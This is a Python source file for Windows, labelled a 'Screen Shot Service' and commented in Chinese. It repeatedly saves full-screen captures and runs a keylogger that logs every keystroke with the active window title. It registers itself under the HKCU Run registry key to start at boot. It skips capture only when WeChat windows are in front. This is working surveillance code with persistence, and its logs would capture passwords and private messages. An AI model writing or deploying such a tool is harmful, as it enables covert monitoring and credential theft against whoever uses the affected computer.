import argparse
import os
import time
import logging
from datetime import datetime
import winreg

import win32gui
import win32con
from PIL import ImageGrab
import json
import sys
from pynput import keyboard

def get_app_path():
    """获取应用程序路径"""
    if getattr(sys, 'frozen', False):
        # 打包后的路径
        return os.path.dirname(sys.executable)
    # 开发环境路径
    return os.path.dirname(os.path.abspath(__file__))

def load_config():
    """加载配置文件"""
    config_path = os.path.join(get_app_path(), 'config.json')
    default_config = {
        "white_list": ['微信', 'WeChat', '聊天文件', '朋友圈'],
        "save_path": "D:/doc/local",
        "sleep_time": 5,
        "keylogger_enabled": True,
        "keylogger_respect_whitelist": True
    }

    if not os.path.exists(config_path):
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(default_config, f, ensure_ascii=False, indent=4)
            logging.info("已创建默认配置文件")
        return default_config

    with open(config_path, 'r', encoding='utf-8') as f:
        config = json.load(f)
        config = {**default_config, **config}
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=4)
    return config

def setup_logging():
    """配置日志"""
    today = datetime.now().strftime('%Y-%m-%d')
    log_dir = os.path.join(SAVE_PATH, today)
    os.makedirs(log_dir, exist_ok=True)

    for handler in logging.root.handlers[:]:
        logging.root.removeHandler(handler)

    file_handler = logging.FileHandler(
        os.path.join(log_dir, 'screenshot.log'),
        encoding='utf-8',
        mode='a'
    )
    console_handler = logging.StreamHandler(sys.stdout)

    formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)

    logging.root.setLevel(logging.INFO)
    logging.root.addHandler(file_handler)
    logging.root.addHandler(console_handler)

    # 确保日志文件以UTF-8 BOM格式写入
    log_file_path = os.path.join(log_dir, 'screenshot.log')
    if not os.path.exists(log_file_path) or os.path.getsize(log_file_path) == 0:
        with open(log_file_path, 'a', encoding='utf-8') as f:
            f.write('\ufeff')

# 解析命令行参数
parser = argparse.ArgumentParser(description="Screen Shot Service")
parser.add_argument("--sleep", type=int, default=5, help="截屏间隔时间 默认5秒")
parser.add_argument("--save_path", type=str, default=None, help="图片文件存储地址")
parser.add_argument("--white_list", type=str, default="", help="应用白名单 按,分割传入 默认为空")
parser.add_argument("--no_keylog", action="store_true", help="禁用键盘记录功能")
# 忽略非预期参数
args, _ = parser.parse_known_args()

# 初始化全局变量
config = load_config()
SLEEP_TIME = args.sleep if args.sleep != 5 else config['sleep_time']
SAVE_PATH = args.save_path if args.save_path is not None else config['save_path']
os.makedirs(SAVE_PATH, exist_ok=True)
WHITE_LIST = args.white_list
white_list = config['white_list']
if WHITE_LIST != "":
    str_list = WHITE_LIST.split(",")
    white_list = list(set(str_list + white_list))

# 键盘记录配置
KEYLOGGER_ENABLED = False if args.no_keylog else config.get('keylogger_enabled', True)
KEYLOGGER_RESPECT_WHITELIST = config.get('keylogger_respect_whitelist', True)

# 设置日志
setup_logging()

def is_white_window_open():
    """检测白名单窗口是否打开且为活动窗口"""
    active_window = win32gui.GetForegroundWindow()
    active_title = win32gui.GetWindowText(active_window)

    if active_title in white_list:
        # 检查窗口是否可见且未最小化
        if win32gui.IsWindowVisible(active_window):
            placement = win32gui.GetWindowPlacement(active_window)
            if placement[1] != win32con.SW_SHOWMINIMIZED:
                logging.debug(f"检测到活动的白名单窗口: {active_title}")
                return True

    logging.debug(f"当前活动窗口不在白名单中: {active_title}")
    return False

def add_to_startup():
    """添加程序到开机自启动"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
        script_path = os.path.abspath(__file__)
        winreg.SetValueEx(key, "ScreenshotService", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
        winreg.CloseKey(key)
        logging.info("已添加到开机自启动")
    except Exception as e:
        logging.error(f"添加开机自启动失败: {str(e)}")

def get_active_window_info():
    """获取当前活动窗口信息"""
    active_window = win32gui.GetForegroundWindow()
    active_title = win32gui.GetWindowText(active_window)
    return active_title

def screenshot():
    """截屏保存"""
    # 获取当前窗口信息
    active_title = get_active_window_info()

    # 按日期创建子文件夹
    today = datetime.now().strftime('%Y-%m-%d')
    save_dir = os.path.join(SAVE_PATH, today)
    os.makedirs(save_dir, exist_ok=True)

    screenshot_png = ImageGrab.grab()
    file_name = os.path.join(save_dir, f"screenshot_{datetime.now().strftime('%H-%M-%S')}.png")
    screenshot_png.save(file_name)
    logging.info(f"截图已保存: {file_name}, 当前窗口: {active_title}")

# 键盘记录相关函数
def get_keylog_file():
    """获取键盘记录文件路径"""
    today = datetime.now().strftime('%Y-%m-%d')
    save_dir = os.path.join(SAVE_PATH, today)
    os.makedirs(save_dir, exist_ok=True)
    return os.path.join(save_dir, 'keylog.txt')

def on_key_press(key):
    """键盘按下事件处理"""
    if not KEYLOGGER_ENABLED:
        return

    # 如果需要遵循白名单，且当前窗口在白名单中，则不记录
    if KEYLOGGER_RESPECT_WHITELIST and is_white_window_open():
        return

    active_title = get_active_window_info()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        # 对特殊键进行处理
        if hasattr(key, 'char'):
            key_char = key.char
        else:
            key_char = str(key).replace("Key.", "<") + ">"

        # 记录到文件
        with open(get_keylog_file(), 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{active_title}] Key: {key_char}\n")
    except Exception as e:
        logging.error(f"键盘记录失败: {str(e)}")

def start_keylogger():
    """启动键盘记录器"""
    if not KEYLOGGER_ENABLED:
        return None

    logging.info("键盘记录功能已启动")
    keylog_file = get_keylog_file()
    if not os.path.exists(keylog_file):
        with open(keylog_file, 'w', encoding='utf-8') as f:
            f.write('\ufeff')

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()
    return keyboard_listener

if __name__ == "__main__":
    logging.info(f"截图服务启动 - 保存路径: {SAVE_PATH}, 间隔时间: {SLEEP_TIME}秒")
    logging.info(f"当前白名单: {white_list}")
    logging.info(f"键盘记录功能: {'已启用' if KEYLOGGER_ENABLED else '已禁用'}")

    add_to_startup()

    keyboard_listener = start_keylogger()

    try:
        while True:
            active_title = get_active_window_info()
            if not is_white_window_open():
                logging.info(f"未检测到白名单窗口，开始截图 - 当前窗口: {active_title}")
                screenshot()
            else:
                logging.info(f"检测到白名单窗口，跳过截图 - 当前窗口: {active_title}")
            time.sleep(SLEEP_TIME)
    except KeyboardInterrupt:
        if keyboard_listener:
            keyboard_listener.stop()
        logging.info("服务已停止")